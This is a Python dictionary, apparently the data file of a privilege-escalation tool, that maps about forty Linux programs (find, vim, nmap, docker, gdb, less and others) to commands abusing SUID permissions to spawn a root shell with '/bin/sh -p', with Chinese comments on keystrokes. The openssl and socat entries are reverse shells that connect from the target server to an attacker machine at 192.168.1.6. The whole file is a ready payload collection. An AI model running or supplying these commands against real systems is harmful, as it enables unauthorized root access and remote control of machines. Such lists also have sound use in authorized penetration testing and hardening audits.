data={'awk':'''awk 'BEGIN {system("/bin/bash -p")}''',
    'bash':'bash -p',
    'csh':'csh -b',
    'dmesg':'dmesg -H\n!/bin/sh -p',
    'docker':'docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
    'ed':'ed\n!/bin/sh -p',
    'env':'env /bin/sh -p',
    'expect':'''expect -c 'spawn /bin/sh -p;interact''',
    'find':'find . -exec /bin/sh -p \; -quit',
    'flock':'flock -u / /bin/sh -p',
    'ftp':'ftp\n!/bin/sh -p',
    'gdb':'''gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit''',
    'gimp':'''gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")''',
    'git':'git help status  //在底行输入“!/bin/sh -p”',
    'ionice':'ionice /bin/sh -p',
    'ip':'ip netns add foo\nip netns exec foo /bin/sh -p\nip netns delete foo',
    'ksh':'ksh -p',
    'less':'''less /etc/profile  //读取文件，在底行输入!/bin/sh -p''',
    'logsave':'logsave /dev/null /bin/sh -i -p',
    'make':'''COMMAND='/bin/sh -p'\nmake -s --eval=$'x:\n\t-'"$COMMAND"''',
    'man':'man man  //在底行输入"!/bin/sh -p"',
    'more':'more /etc/profile\n!/bin/sh -p',
    'nano':'nano  //运行nano程序\n^R  //按下ctrl-r\n^X  //按下ctrl-x\nreset; sh -p 1>&0 2>&0  //输入下面的命令',
    'nice':'nice /bin/sh -p',
    'nmap':'''echo "os.execute('/bin/bash -p')" > /tmp/shell.nse\nnmap --script=/tmp/shell.nse 127.0.0.1''',
    'openssl':'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n'
              'openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n之后在CentOS服务器上执行下面的命令：RHOST=192.168.1.6\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -p -i < /tmp/s 2>&1 | openssl s_client -quiet -no_ign_eof -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s',
    'php':'''CMD="/bin/sh"\nphp -r "pcntl_exec('/bin/sh', ['-p']);"''',
    'python':'''python -c 'import os; os.execl("/bin/sh", "sh", "-p")''',
    'rpm':'''rpm --eval '%{lua:os.execute("/bin/sh -p")}''',
    'rsync':'''rsync -e 'sh -p -c "sh -p 0<&2 1>&2"' 127.0.0.1:/dev/null''',
    'rvim':'''rvim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")''',
    'setarch':'setarch $(arch) /bin/sh -p',
    'socat':'''攻击者首先在自己的计算机启动对TCP 8888端口的监听\nsocat file:'/dev/tty',raw,echo=0 tcp-listen:8888\n服务器通过socat发起连接：\nsocat tcp-connect:192.168.1.6:8888 exec:'/bin/sh -p',pty,stderr''',
    'ssh':'''ssh -o ProxyCommand=';sh -p 0<&2 1>&2' x''',
    'strace':'strace -o /dev/null /bin/sh -p',
    'stdbuf':'stdbuf -i0 /bin/sh -p',
    'taskset':'taskset 1 /bin/sh -p',
    'tclsh':'tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr',
    'time':'time /bin/sh -p',
    'timeout':'timeout 7d /bin/sh -p',
    'vim':'''vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")''',
    'watch':'''watch -x sh -c 'reset; exec sh -p 1>&0 2>&0''',
    'xargs':'xargs -a /dev/null sh -p',
    'zsh':'zsh'}